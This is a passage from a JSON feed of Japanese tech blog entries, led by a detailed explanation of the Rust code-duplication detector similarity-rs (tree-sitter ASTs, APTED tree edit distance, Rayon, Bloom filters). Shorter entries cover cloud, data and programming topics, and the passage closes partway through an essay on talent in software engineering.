のフレームワークに基づくバランス評価——これらを組み合わせた実用的なツールだ。コードの「ちょうどいい距離感」を数値化し、可視化することで、リファクタリングの指針となることを目指す。ここで忘れてはいけないのは、結合をゼロにするのが目的ではないということだ。人間関係と同じように、コードにも「適切な距離感」がある。密接に関連する機能は、むしろ強く結合すべきだ。無理に引き離せば、かえって複雑になる。定期的な測定と分析により、過度な抽象化を避けつつ、柔軟で進化可能な設計を維持していこう。コードの「ちょうどいい距離感」は、測定することで初めて見えてくる。ネットワーク・エフェクト 事業とプロダクトに欠かせない強力で重要なフレームワーク作者:アンドリュー・チェン日経BPAmazon","isoDate":"2025-10-31T03:52:56.000Z","dateMiliSeconds":1761882776000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Gemini Enterprise（旧Google Agentspace）を活用する","link":"https://sreake.com/blog/get-started-with-gemini-enterprise/","contentSnippet":"Gemini Enterprise（旧Google Agentspace）の概要 2025/10/10まではGoogle Agentspaceと呼ばれていたGoogle AIアシスタントサービスのサービス名称変更が行われ […]The post Gemini Enterprise（旧Google Agentspace）を活用する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-31T01:22:38.000Z","dateMiliSeconds":1761873758000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【初心者向け】Snowflakeロールベースアクセス制御（RBAC）解説","link":"https://sreake.com/blog/learn-about-snowflake-role-based-access-control/","contentSnippet":"はじめに Snowflakeでデータ分析基盤を構築するうえで、最も重要な要素の一つがロール管理です。これはデータガバナンスの活動の第一歩の位置付けでもあり、さらにはある程度成熟された基盤の状態からロールを再設計するコスト […]The post 【初心者向け】Snowflakeロールベースアクセス制御（RBAC）解説 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-31T01:21:49.000Z","dateMiliSeconds":1761873709000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Cloud Run FunctionsにTerraformを使ってデプロイしてみた","link":"https://zenn.dev/akasan/articles/d94c8407a99c90","contentSnippet":"今回はTerraformを利用してCloud Run Functionsにサービスをデプロイしてみました。 構築するアーキテクチャ今回構築するアーキテクチャは以下のようになっています。Cloud Storageでは提供するアプリケーションのソースコードをZIPファイルで格納し、Cloud Run FunctionsではCloud Storageからソースコードを参照した上でサービスを展開します。 早速構築 Pythonアプリケーションの実装今回は呼び出すとHello World!と返すエンドポイントの提供を目指します。そのような仕組みを実現するために必要なファイルは以下...","isoDate":"2025-10-30T12:39:31.000Z","dateMiliSeconds":1761827971000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"構造的類似性を捉える技術 - similarity-rsで学ぶAST-basedコード解析の実装","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/30/203342","contentSnippet":"github.comはじめにコードベースが大きくなるにつれて、似たようなコードが散らばっていることに気づく瞬間がある。「あれ、これ前にも書いたような...」そう思いながらコードを眺めるのだけれど、変数名が微妙に違っていたり、処理の順序が少しずれていたりして、結局は共通化できないまま放置してしまう。そんな経験は、プログラマなら誰しも一度や二度ではないはずだ。そして、生成AI時代の今、この問題はさらに深刻になっている。AIがコードを生成してくれるのは便利だけれど、同じような処理を少しずつ違う形で何度も生成してしまうことがある。人間が書いたコードなら「ああ、これは前に書いたやつだ」と気づけるのに、AIが生成したコードは一見して判別がつかない。気づけばコードベースは「似て非なるコード」で溢れかえり、保守性は急速に失われていく。生成AI時代だからこそ、コードの構造的な類似性を見抜く技術が、これまで以上に必要とされているのだ。私は、結合度を測って適切にリファクタリングを促すツールを開発したいと考えていた。そのヒントを探していたときに出会ったのが、@mizchiさんのsimilarityプロジェクトだった。このプロジェクトの中でも特に、Rustへの実装であるsimilarity-rsの仕組みに惹かれ、その内部構造を詳しく調査することにした。この記事は、そこで得られた発見の記録である。syu-m-5151.hatenablog.com実際の使用例は以下です。# インストール（Cargo経由）cargo install similarity-rs# プロジェクトルートで実行similarity-rs .# より詳細なオプションを確認similarity-rs -h# AI によって修正させる場合Run `similarity-rs .` to detect semantic code similarities. Execute this command, analyze the duplicate code patterns, and create a refactoring plan. Check `similarity-rs -h` for detailed options.実行すると、以下のように重複コードを検出します。Duplicates in src/utils.rs:────────────────────────────────────────────────────────────src/utils.rs:10 | L10-15 similar-function: calculateSumsrc/utils.rs:20 | L20-25 similar-function: addNumbersSimilarity: 85.00%, Priority: 8.5 (lines: 10)これがどうやって実現されているのか、その内部実装を紐解いていきます。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。similarity-rsとは何か？similarity-rs は、similarity の中の Rust プロジェクトのコード重複を検出する CLI ツールです。ただし、単純なテキストマッチングではありません。抽象構文木（AST）を使った構造的な比較により、変数名が違っても本質的に同じ処理をしている関数を見つけ出せます。例えば、以下の 2 つの関数は変数名が違いますが、similarity-rs は「これらは似ている」と判断できます。fn calculate_total(items: Vec<i32>) -> i32 {    let mut sum = 0;    for item in items {        sum += item;    }    sum}fn add_numbers(values: Vec<i32>) -> i32 {    let mut result = 0;    for value in values {        result += value;    }    result}テキストベースの diff ツールなら「全然違う」と判断する場合でも、similarity-rs は「構造が同じ」と判定できます。技術スタックの全体像similarity-rs の核となる技術は 2 つです。tree-sitter - Rust コードを解析して AST を生成APTED (All Path Tree Edit Distance) - 2 つの AST の距離を計算この 2 つを組み合わせることで、「コードの意味的な類似度」を数値化しています。なぜtree-sitterなのか？tree-sitter は、GitHub が開発した高速でインクリメンタルなパーサーです。rustc の手書きパーサーと比べると初回パースは 2-3 倍遅いですが、以下の利点があります。インクリメンタルパース: コードの一部が変更されたとき、変更部分だけ再パースできる堅牢性: 構文エラーがあっても部分的にパースを続行できる多言語対応: 同じインターフェースで複数の言語に対応実測値は次のとおりです。2157行のRustファイル（約64KB）のパース時間：- 初回: 約6.48ms- インクリメンタル更新: 1ms未満- スループット: 約9908 bytes/ms初回パースで約 6.48ms、インクリメンタル更新では 1ms 未満という実測値が得られています。ASTベース比較の仕組みStep 1: コードをASTに変換するまず、Rust コードを tree-sitter でパースします。use tree_sitter::{Parser, Language};let mut parser = Parser::new();parser.set_language(&tree_sitter_rust::LANGUAGE.into())    .expect(\\"Error loading Rust grammar\\");let source_code = \\"fn test() { println!(\\\\\\"hello\\\\\\"); }\\";let tree = parser.parse(source_code, None).unwrap();生成される AST は、以下の階層構造になります。source_file└── function_item    ├── fn (keyword)    ├── identifier: \\"test\\"    ├── parameters    └── block        └── macro_invocation            └── ...Step 2: 関数を抽出するAST から関数定義を抽出します。この時、以下のような工夫がされています。fn extract_functions(tree: &Tree, source: &str) -> Vec<Function> {    let mut functions = Vec::new();    let root = tree.root_node();        fn visit_node(node: Node, source: &str, functions: &mut Vec<Function>) {        match node.kind() {            \\"function_item\\" => {                // テスト関数は除外                if !is_test_function(&node, source) {                    functions.push(Function::from_node(node, source));                }            }            \\"impl_item\\" => {                // implブロック内のメソッドも処理                for child in node.children() {                    if child.kind() == \\"function_item\\" {                        if !is_test_function(&child, source) {                            functions.push(Function::from_node(child, source));                        }                    }                }            }            _ => {                // 再帰的に子ノードを探索                for child in node.children() {                    visit_node(child, source, functions);                }            }        }    }        visit_node(root, source, &mut functions);    functions}注目すべき点として、テスト関数は自動的に除外されます。以下の 3 つの方法で検出します。#[test] 属性がついている関数test_ で始まる関数名（Rust の慣習）#[cfg(test)] モジュール内の関数これにより、本番コードの重複だけに集中できます。Step 3: 木構造の編集距離（TSED）を計算するここが最も興味深い部分です。2 つの AST がどれだけ「似ているか」を測定するために、Tree Edit Distance（木構造の編集距離）を使用します。木構造の編集距離とは？木構造を別の木構造へ変換する際に必要な「編集操作の最小回数」です。編集操作は 3 種類あります。Insert（挿入）: ノードを追加Delete（削除）: ノードを削除Rename（名前変更）: ノードのラベルを変更例を示します。Tree 1:          Tree 2:   A                A  / \\\\              / \\\\ B   C            B   D編集操作：1. C を D に Rename編集距離 = 1APTEDアルゴリズムsimilarity-rs は、APTED (All Path Tree Edit Distance) アルゴリズムを使用しています。これは 2015-2016 年に Pawlik と Augsten が発表したアルゴリズムで、以下の特徴があります。最適な分解戦略: 木を最も効率的に分解して計算動的計画法: 部分問題の結果をメモ化して再利用時間計算量: O(n\xb7m) - 理論的に最適実装の概要は以下のとおりです。fn calculate_similarity(tree1: &TreeNode, tree2: &TreeNode, options: &TSEDOptions) -> f64 {    // APTEDで編集距離を計算    let edit_distance = compute_edit_distance(tree1, tree2);        // 正規化：類似度スコア（0.0〜1.0）に変換    let max_nodes = max(tree1.node_count(), tree2.node_count());    let base_similarity = 1.0 - (edit_distance as f64 / max_nodes as f64);        // サイズ差ペナルティを適用（オプション）    if !options.no_size_penalty {        let size_ratio = min_size as f64 / max_size as f64;        base_similarity * size_ratio    } else {        base_similarity    }}重要な発見として、ACL 2024 の研究論文（Song et al.）によると、以下の重みが最適とされています。Insert: 0.8Delete: 1.0Rename: 1.0この重みは実験によって導き出されたもので、48 以上のプログラミング言語で有効性が実証されています。ただし、similarity-rsの現在のデフォルト実装では異なる設定が使用されています。Rename: 0.3（デフォルト）Delete: 1.0Insert: 1.0研究論文で推奨される最適値とは異なりますが、--rename-costオプションで調整可能です。パフォーマンス最適化の技術1. Rayonによる並列処理similarity-rs の最大の強みの 1 つが、Rayon を使った並列処理です。use rayon::prelude::*;// ファイルを並列処理files.par_iter()    .flat_map(|file| extract_functions(file))    .collect()// 関数比較も並列化functions.par_iter()    .enumerate()    .flat_map(|(i, func1)| {        functions[i+1..].par_iter()            .map(|func2| compare_functions(func1, func2))    })    .filter(|similarity| similarity.score > threshold)    .collect()Rayon の優れた特徴は次のとおりです。ワークスティーリング: CPU コア間で自動的に負荷分散データ競合フリー: Rust の型システムが保証（Send + Syncトレイト）ゼロ同期オーバーヘッド: データ共有が不要な場合線形スケーラビリティ: CPU コア数に応じてほぼ線形に高速化実際のベンチマークでは、中規模ファイルで逐次処理比16倍の高速化が確認されています。2. ブルームフィルタによる事前フィルタリングTypeScript 版（similarity-ts）で先行実装され、Rust 版でも部分的にサポートされています。高速化に大きく貢献するテクニックです。struct AstFingerprint {    bloom_filter: BloomFilter,           // 確率的集合メンバーシップ    node_types: HashSet<NodeKind>,    signature: u64,                      // ハッシュベース署名}fn quick_reject(&self, func1: &FunctionDef, func2: &FunctionDef) -> bool {    let intersection = self.bloom_filter        .estimate_intersection(&func1.fingerprint, &func2.fingerprint);        let estimated_similarity = intersection / max(func1.size, func2.size);    estimated_similarity < self.min_similarity_threshold}この手法による効果は次のとおりです。比較回数を 70-90%削減偽陽性率 1%未満TypeScript 版で約 4 倍の高速化を実現明らかに違う関数ペアを高価な TSED 計算の前に除外できるため、全体の処理時間が 70-90%削減されます。Rust 版での実装状況は次のとおりです。crates/core/src/ast_fingerprint.rsにブルームフィルタの基礎実装が存在--no-fastオプションでブルームフィルタを無効化可能TypeScript 版ほど最適化されていないが、将来的な改善が期待される3. メモリ最適化の工夫Rust の所有権システムとゼロコスト抽象化を活かした最適化がいくつも施されています。ライフタイム注釈によるゼロコピーの例を示します。pub struct FunctionComparison<\'a> {    func1: &\'a FunctionDefinition,    func2: &\'a FunctionDefinition,    similarity: f64,}データをクローンせず、参照を渡すだけで済みます。イテレータチェーンによる変換の例を示します。let similar_pairs: Vec<_> = functions.iter()    .enumerate()    .flat_map(|(i, f1)| {        functions.iter()            .skip(i + 1)            .filter_map(|f2| {                let sim = calculate_similarity(f1, f2);                (sim > threshold).then_some((f1, f2, sim))            })    })    .collect();この書き方の利点は次のとおりです。イテレータチェーンはタイトなループにコンパイルされる中間値のヒープアロケーションが発生しない遅延評価により、collectされるまで計算しない実際の使い方と出力フォーマット基本的な使い方# カレントディレクトリを解析similarity-rs .# 類似度の閾値を指定（デフォルト: 0.85）similarity-rs . --threshold 0.9# テスト関数をスキップsimilarity-rs . --skip-test# ファイル間の比較も有効化similarity-rs . --cross-file# コードスニペットを出力に含めるsimilarity-rs . --print# 最小トークン数を指定（小さい関数を除外）similarity-rs . --min-tokens 50出力の読み方Duplicates in src/utils.rs:────────────────────────────────────────────────────────────src/utils.rs:10 | L10-15 similar-function: calculateSumsrc/utils.rs:20 | L20-25 similar-function: addNumbersSimilarity: 85.00%, Priority: 8.5 (lines: 10)────────────────────────────────────────────────────────────src/utils.rs:30 | L30-40 similar-function: processDatasrc/handlers.rs:50 | L50-60 similar-function: handleRequestSimilarity: 92.00%, Priority: 11.5 (lines: 12)Priority は次の計算式で求められます: 行数 \xd7 類似度スコアこれにより、影響度の高い重複（長くて似ている）を優先的に見つけられます。VSCode 互換の出力フォーマットを採用しており、ターミナルからファイル名をクリックすることで該当箇所に直接ジャンプできます。処理フローの全体像similarity-rs がどのように動作するのか、全体の流れを説明します。1. ファイル検索   └─> ディレクトリを再帰的にスキャンして.rsファイルを検索   2. パース段階   └─> 各ファイルに対して:       ├─> tree-sitterがソースをASTにパース       └─> ASTから関数ノードを抽出       3. フィルタリング段階   └─> 各関数に対して:       ├─> 最小行数/トークン数をチェック       ├─> テスト関数かチェック（--skip-test有効時）       └─> 合格すれば候補プールに追加       4. 特徴抽出（高速モード）   └─> ブルームフィルタ用のAST特徴を抽出   └─> 各関数のブルームフィルタを構築   5. 候補ペア生成   └─> 比較する関数ペアを生成       ├─> 同一ファイル内ペア（デフォルト）       └─> ファイル間ペア（--cross-file時）       6. ブルームフィルタ事前フィルタリング   └─> ブルームフィルタで高速チェック   └─> 明らかに異なるペアを除外   7. TSED計算   └─> 残りのペアに対して:       ├─> APTEDで木編集距離を計算       ├─> サイズペナルティを適用（有効時）       └─> 類似度スコアに正規化       8. 閾値フィルタリング   └─> 類似度 >= 閾値のペアを保持   9. 出力生成   └─> 結果をフォーマット（JSONまたは人間可読）   └─> --printフラグ時はコードスニペットを含むTypeScript版（similarity-ts）との比較mizchi さんのプロジェクトには、TypeScript 版も存在します。各実装の特徴を比較します。アーキテクチャの違い 側面  similarity-ts  similarity-rs  パーサー  oxc-parser（Rust製）  tree-sitter-rust  メモリ管理  アリーナアロケーション  標準ヒープ  高速モード  ブルームフィルタ完全実装  部分的実装  型チェック  実験的サポート  実験的サポート（--experimental-types） パフォーマンス比較実際のベンチマーク結果に基づく比較を示します。similarity-rs（Rust 版）の利点は次のとおりです。中規模ファイルで約 16 倍高速（ネイティブコードの効率性）メモリ使用量が一定（Rc による参照カウント）大規模ファイルでも安定動作（TypeScript は OOM エラー発生）ネイティブ Rust コード（FFI オーバーヘッドなし）Rust 固有機能（#[test]属性の検出など）similarity-ts（TypeScript 版）の利点は次のとおりです。小規模ファイルではやや高速（0.74x、プロセス起動オーバーヘッドなし）ブルームフィルタ高速モードで約 4 倍高速化oxc-parser による高速パース（swc より 3 倍高速）アリーナアロケーションによるキャッシュ局所性向上JavaScript エコシステムとの統合が容易言語固有機能similarity-ts の機能は次のとおりです。型類似度検出クラス比較サポートデコレータサポートsimilarity-rs の機能は次のとおりです。implブロック解析テスト関数フィルタリングトレイト実装検出研究基盤と理論的背景similarity-rs の背後には、しっかりとした研究基盤があります。TSED研究論文（Song et al., ACL 2024）この研究では、48 以上のプログラミング言語で TSED の有効性が実証されました。BLEU および Jaccard 類似度と 0.6-0.8 の相関実行一致に関して意味論的メトリクスより高精度最適重み: Insert=0.8、Delete=1.0、Rename=1.0APTEDアルゴリズム（Pawlik & Augsten, 2015-2016）木編集距離の堅牢な実装を提供し、メモリ使用量を抑制最適な分解戦略により O(n\xb7m) の時間計算量で動作以前のアルゴリズム（RTED、Demaine など）を凌駕学術的にも裏付けられた手法を使っている点は信頼性が高いです。実用例：リファクタリング計画の立て方実際の使用方法とリファクタリングへの活用方法を説明します。Step 1: 重複コードを検出similarity-rs . --threshold 0.85 --skip-test > duplicates.txtStep 2: 優先度の高い重複を確認出力の Priority スコアを見て、影響の大きい重複から着手します。Priority: 11.5 (lines: 12, similarity: 92%)Step 3: リファクタリング方針を決定検出された重複コードを見て、以下を判断します。共通化できる場合共通関数として抽出部分的に共通化できる場合共通部分を関数として抽出差分をパラメータ化偶然の重複である場合本質的に異なる処理なので、そのままStep 4: 継続的なモニタリングCI/CD パイプラインに組み込んで、新しい重複が生まれないか監視します。# .github/workflows/code-quality.yml- name: Check code duplication  run: |    similarity-rs . --threshold 0.85 --skip-test    if [ $? -ne 0 ]; then      echo \\"Warning: Code duplication detected\\"      # Slackに通知するなど    fi制限事項と今後の展望現在の制限公式ドキュメントにも明記されていますが、similarity-rs は実験段階です。プロダクション環境での検証が不十分ブルームフィルタが部分的実装（similarity-ts ほど最適化されていない）マクロヘビーなコードには制限があるrustc パーサーより 2-3 倍遅い（初回パース時）既知の問題（KNOWN_ISSUES.md より）は次のとおりです。Enum similarity detection: 構造的に同一の Enum でも約 43%の類似度しか検出されない原因: Enum の variant 名が value として扱われ、rename_cost パラメータで適切に処理されない回避策: Enum 比較時は閾値を 0.4-0.5 に下げるStruct similarity detection: 正常に動作（90%以上の類似度を検出）similarity-rsから学んだことsimilarity-rs を深掘りした結果、このツールから多くの重要な学びを得ることができました。まず最も印象的だったのは、ASTベース解析の威力です。従来のテキストベースの類似度検出では、表面的な文字列の一致に頼るため、変数名やコメントの違いによって本質的に同じコードを見逃してしまうことがありました。しかし、AST ベースのアプローチでは構造的な類似性を捉えることができます。変数名が異なっていても、処理のロジックや制御構造が同じであれば、それを的確に検出できる点は非常に強力です。次に感銘を受けたのは、Rust の型システムが可能にする最適化です。Rust の所有権システムは、メモリ安全性をコンパイル時に保証します。さらに、ゼロコスト抽象化により、高レベルな記述をしながらも実行時のオーバーヘッドを最小限に抑えられます。加えて、充実した並行処理プリミティブにより、マルチスレッド処理を安全に記述できます。これらの特性を組み合わせることで、安全性とパフォーマンスを両立したツールの実装が実現されています。また、実装の随所に見られる実用的な最適化の積み重ねも注目に値します。ブルームフィルタによる事前フィルタリングで不要な比較を削減し、Rayon を活用した並列処理で処理速度を向上させています。さらに、テスト関数の自動除外や最小トークン数によるフィルタリングなど、実際の開発現場で役立つ工夫が随所に施されています。このような小さな最適化の積み重ねが、理論だけでなく実用的なツールを作り上げる鍵となることを実感しました。最後に、このツールはACL 2024の論文をベースにした実装である点も重要です。学術研究で提案されたアイデアを、実際に動作するソフトウェアとして具現化しており、理論と実践の橋渡しをしている好例と言えます。研究成果を実装に落とし込む過程で、どのような工夫や最適化が必要になるのかを学ぶことができました。おわりに冒頭で述べた「結合度を測って適切にリファクタリングを促すツール」について、similarity-rs から学んだアプローチを応用できます。AST ベースの解析で構造的な類似性を捉える並列処理で大規模コードベースにも対応優先度スコアでリファクタリングの優先順位を示すCI/CD 統合で継続的にコード品質を監視similarity-rs の実装を理解したことで、自分が作りたいツールの具体的なイメージが明確になりました。GitHub リポジトリで実装の詳細を確認できます。コードは読みやすく構成されているため、Rust の学習にも適した教材です。Tidy First? ―個人で実践する経験主義的ソフトウェア設計作者:Kent Beckオーム社Amazon参考文献mizchi/similarity - GitHubZenn記事：TypeScript/Rustで高速なコード類似度検出ツールを作るtree-sitter - Official DocumentationRayon - Data Parallelism in Rust","isoDate":"2025-10-30T11:33:42.000Z","dateMiliSeconds":1761824022000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Trayce, a Raycast Extension for Tokyo AI Hackathon 2025","link":"https://speakerdeck.com/ota1022/trayce-a-raycast-extension-tokyo-ai-hackathon-2025","contentSnippet":"The pitch deck for a Raycast extension called Trayce, created at the Tokyo AI Hackathon.\\rhttps://raycast.connpass.com/event/369928/","isoDate":"2025-10-30T04:00:00.000Z","dateMiliSeconds":1761796800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"WebSocket入門：GoでEcho/Chat機能を実装してみた","link":"https://zenn.dev/takehiro1111/articles/go_web_socket","contentSnippet":"1.記事を書いた背景WebSocket の実装が初めてだったこともあり、頭の中を整理しておこうと思い記事にしました。全然関係ないですが、1 年くらい前にプロダクトへサーバレス構成でチャット機能を実装する時にインフラ側の基盤を作ったのが懐かしく感じました。 2.対象読者WebSocket って聞いたことあるけど何だっけという方(自分みたいな)実装レベルで気になる方(自分みたいな) 3.WebSocket とは？WebSocket API は、ユーザーのブラウザーとサーバー間で対話的な通信セッションを開くことができるものです。この API を使用すると、サーバー...","isoDate":"2025-10-30T02:43:23.000Z","dateMiliSeconds":1761792203000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Pythonのlistとsetでの値の含み判定の所要時間について","link":"https://zenn.dev/akasan/articles/b9e7806e438f8f","contentSnippet":"今回はPythonのlistとsetでデータが含まれているかどうかを判定するためのロジックの所要時間の差について調べてみました。Pythonの仕様として、単純にデータを列挙しておきたいだけの場合にlistを利用せずsetを利用する方が良い場合もあり個人的に気をつけていましたが、以下の記事をみて実際にlistとsetでどれくらい差が出るかを調べてみようと思いました。今回は値の一覧に特定の値が含まれているかを判定するのにかかる時間を調べてみました。https://medium.com/the-pythonworld/stop-using-if-x-in-list-heres-the-fas...","isoDate":"2025-10-29T11:40:49.000Z","dateMiliSeconds":1761738049000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Rayシリーズ：NumPyやpandasデータをRay Dataで取り込む","link":"https://zenn.dev/akasan/articles/db0b5b634d453d","contentSnippet":"今回はRay Dataを利用して、NumPyとpandasのデータを読み込む方法をまとめます。 早速試してみる内容はこちらを参考にしています。https://docs.ray.io/en/latest/data/loading-data.html#loading-data-from-other-libraries 環境構築uvを利用して以下のように構築します。uv init ray_data_numpy_pandas -p 3.12cd ray_data_numpy_pandasuv add \\"ray[data]\\" numpy pandas NumPyからデータを...","isoDate":"2025-10-28T14:21:11.000Z","dateMiliSeconds":1761661271000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"ソフトウェアエンジニアにおける才能という幻想、あるいは成長を阻む最大の敵について","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/28/113009","contentSnippet":"はじめに「才能がない」と言われたことがあるでしょうか。それとも、友人や知り合いと自分を比べて、自分で自分にそう言い聞かせたことがあるでしょうか。学生の頃からエンジニアを志してきた私は、コンテストで優秀な成績を残す人たちを目の当たりにしてきました。大手IT企業に入社し、優秀な同期と出会いました。勉強会やカンファレンスに足を運び、そこで出会った人たちの軌跡を追ってきました。華々しくスタートアップを立ち上げた人、革新的なプロダクトを生み出した人、OSSコミュニティで名を馳せる人。一方で、いつの間にか表舞台から姿を消した人もいます。これらがごく一部の狭い世界でしかないことも、自覚しています。そして今、インターンシップやワークショップで若手エンジニアと接する機会が増えました。3年ほど前に始めたこの活動──正直に言うと、自分が未熟なまま始めてしまったという不安は、今でもどこかにあります。彼らと一緒に作業する中で、「才能がない」と自己評価する学生やインターン生に出会うことがよくあります。彼らは真剣な表情で「自分には向いていないかもしれません」と告げます。コードを書くのが遅い。エラーの意味が理解できない。他の人は簡単にできることが、自分には難しい──そう語る彼らの目には、諦めと不安が混じっています。私はその度に、ある問いを投げかけます。「才能って、何だと思う?」「君には才能がある」とも「才能なんて関係ない」とも言わず、まず考えてもらう。しかし大抵の場合、明確な答えは返ってきません。実は、私もかつて、才能という言葉に深く囚われていました。コンテスト会場で、企業の開発フロアで、勉強会の懇親会で、私は何度も「天才」と呼ばれるエンジニアたちに出会いました。彼らは難解なアルゴリズムを一瞬で理解し、複雑なバグを数分で特定し、誰も思いつかないような解決策を次々と生み出していました。そして私は何度も思いました。「自分には才能がない」と。しかし、多くの「一流」と呼ばれる人々と接し、彼らの日常を観察し、そして時には彼らが立ち止まる瞬間や、消えていく瞬間も目撃する中で、ある重要な事実に気づきました。才能という言葉は、実は成長を阻む最大の敵なのかもしれない。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。技術力という幻想才能について語る前に、まずソフトウェアエンジニアリングにおける「技術力」とは何かを整理しておく必要があります。我々の文脈では、才能という言葉はこの技術力と結びつけて語られることが多いためです。技術力という言葉の曖昧さ私たちは「技術力が高い」「技術力が低い」という言葉を安易に使いがちです。しかし、その実態は何でしょうか。率直に言えば、ソフトウェアエンジニアの「技術力」と呼ばれるものの多くは、実は「ちょっと詳しい」「似たようなトラブルを経験している」「これとこれを組み合わせれば行けそう」という程度のものです。私が使ってきた「エンジニアリング」という言葉にも、工学的な要素はあまり含まれていませんでした。正しくは「テクニック」──つまり、実践的な技術や方法論の集積です。特別なスキルというよりは、日々の積み重ねで身につく経験知なのです。では、技術力とは何なのか。私の観察では、それは大きく二つの軸に分解できます。一つは「経験の蓄積」、もう一つは「洞察力としてのセンス」です。センスは知識からはじまる作者:水野学朝日新聞出版Amazon第一の軸：経験の蓄積技術力の第一の要素は、経験の蓄積です。これは、しばしば「同じ失敗を繰り返さない力」として評価されます。具体的には、こういうことです。あるエラーに遭遇したとき、以前に似たようなエラーを見たことがあれば、解決は早くなります。データベースのデッドロック、非同期処理のタイミング問題、キャッシュの不整合──こうした問題は、一度経験していれば「ああ、これか」と気づけます。これは確かに価値のある能力です。経験豊富なエンジニアが重宝されるのは、このためです。しかし、これを「才能」と呼ぶのは適切でしょうか。違います。これは単に時間をかけて様々な問題に向き合った結果であり、誰でも積み重ねられるものです。早く始めた人、多く失敗した人が、より多くの経験を持っているだけです。具体と抽象作者:細谷 功dZERO（インプレス）Amazon第二の軸：洞察力としてのセンス技術力のもう一つの要素、それが「センス」です。音楽をやっている人たちの中で「あいつは耳が良い」と評価される能力があります。単に楽器を弾く技術だけでなく、音のバランス、リズムの微妙なズレ、和音の響き方──こうした細部を感じ取る力のことです。ソフトウェアエンジニアリングにも、これに似たものがあります。コードを見たとき、「このコード、何か変だな」と直感的に感じる。実行する前から「ここでバグが出そう」と予感する。設計図を見て「この構造は将来的に問題になる」と察知する。これが、エンジニアにおける「センス」です。重要なのは、これは単なる経験の蓄積とは質的に異なるということです。同じ年数働いていても、このセンスを持つ人と持たない人がいます。では、このセンスとは何なのでしょうか。センスの哲学 (文春e-book)作者:千葉 雅也文藝春秋Amazonセンスの正体──三つの具体的な現れ方センスは抽象的な概念に聞こえますが、実は具体的に分解できます。私の観察では、センスは主に三つの形で現れます。1. 細部への注目力センスのあるエンジニアは、コード全体の機能だけでなく、細部のリズムやバランスに気づきます。例えば、関数の長さのバランス。あるファイルに25行の関数と5行の関数が混在しているとき、「なぜこの差があるのか」と気づきます。命名の一貫性。ある場所ではgetUserDataと書き、別の場所ではfetchUserと書いているとき、その揺らぎに違和感を覚えます。これらは動作に直接影響しないこともあります。でも、コードの「匂い」として現れます。そして、この匂いに気づけるかどうかが、センスの有無を分けます。ルールズ・オブ・プログラミング ―より良いコードを書くための21のルール作者:Chris Zimmermanオーム社Amazon2. 構造の美しさへの感受性センスのあるエンジニアは、「美しいコード」と「醜いコード」を区別できます。そして最も重要なのは、なぜ美しいと感じるのか、その理由を言語化できることです。「この関数は単一責任原則を守っているから美しい」「この命名は意図が明確に伝わるから良い」「この抽象化は読みやすさと柔軟性を両立しているから綺麗」単に「良い」「悪い」と感じるだけでなく、その判断の根拠を意識できる。これがセンスです。そして、この言語化能力が、他者にも伝えられる知見へと昇華されます。Good Code, Bad Code ～持続可能な開発のためのソフトウェアエンジニア的思考作者:Tom Long秀和システムAmazon改訂新版　良いコード／悪いコードで学ぶ設計入門 ―保守しやすい　成長し続けるコードの書き方作者:仙塲 大也技術評論社Amazon3. 問題の本質を見抜く力最も価値が高いのは、表面的な問題の背後にある本質的な問題を見抜く力です。例えば、バグが報告されたとします。表面的には「nullポインタ例外」かもしれません。しかし、センスのあるエンジニアは、その背後に「状態管理の設計が不適切」という本質的な問題があることに気づきます。エラーログを見て、「このエラーが頻発しているということは、そもそもこの処理フローに問題がある」と洞察します。パフォーマンスの問題を見て、「これは単にクエリの最適化の問題ではなく、データモデルの設計から見直すべき」と判断します。この「一歩踏み込んで問題を捉える力」こそが、経験を超えたセンスの核心です。ライト、ついてますか　問題発見の人間学作者:ドナルド・C・ゴース,ジェラルド・M・ワインバーグ共立出版Amazonセンスは訓練できるのかここまで読んで、「じゃあセンスは才能じゃないか」と思うかもしれません。違います。センスも訓練できます。なぜなら、センスとは突き詰めれば「何に注目するか」という習慣と、「それを面白がれるか」という姿勢だからです。どちらも意識的に育てることができます。熟達論―人はいつまでも学び、成長できる―作者:為末大新潮社Amazon訓練法1：意識的な観察の習慣最初は意識的に練習します。コードレビューをするとき、ただ「動くか動かないか」だけでなく、以下の点に注目してみます。関数の長さのバランスは適切か命名に一貫性はあるか、揺らぎは意図的か抽象度の上下動に違和感はないかコメントの密度は適切か変数のスコープの範囲は適切か最初は面倒です。でも、こうした細部に意識的に注目する習慣を続けていると、やがて自然と細部が目に入るようになります。これがセンスを磨くということです。訓練法2：本質を掴む読み方優れたエンジニアのコードを読むとき、ただ写経するのではなく、その背後にある思考を読み取ろうとします。なぜこの構造を選んだのかなぜこの命名にしたのかなぜこの順序で処理しているのかなぜこの部分だけ抽象化したのかそして、そこから本質的な要素を抽出し、自分のコードに応用する。この「本質を掴む」プロセスを繰り返すことで、表面的なパターンの暗記を超えた理解が生まれます。訓練法3：面白がる回路を作る最も重要なのは、問題を面白がる姿勢を育てることです。センスのあるエンジニアは、エラーや問題を「厄介だ」ではなく「興味深い」と捉えています。この姿勢は、選択できるものです。最初は意識的に「これは面白い」と自分に言い聞かせます。「このバグ、再現条件が複雑で面白い」「このエラーメッセージ、何を伝えようとしているのか興味深い」「この設計の問題、どう解決すべきか考えるのが楽しい」こうした「面白がる回路」を作ることが、センスを磨く本質です。すると徐々に、本当に面白く感じられるようになってきます。そして、面白がれるようになると、自然と深く考えるようになり、結果としてセンスが磨かれます。技術力もセンスも、どちらも成長可能結局のところ、技術力を構成する二つの軸──経験の蓄積とセンスという洞察力──は、どちらも成長可能な能力です。経験は、時間をかけて多くの問題に向き合うことで自然と積み重なります。失敗を恐れず、様々なことに挑戦することで、経験値は増えていきます。センスは、意識的な訓練によって磨かれます。細部に注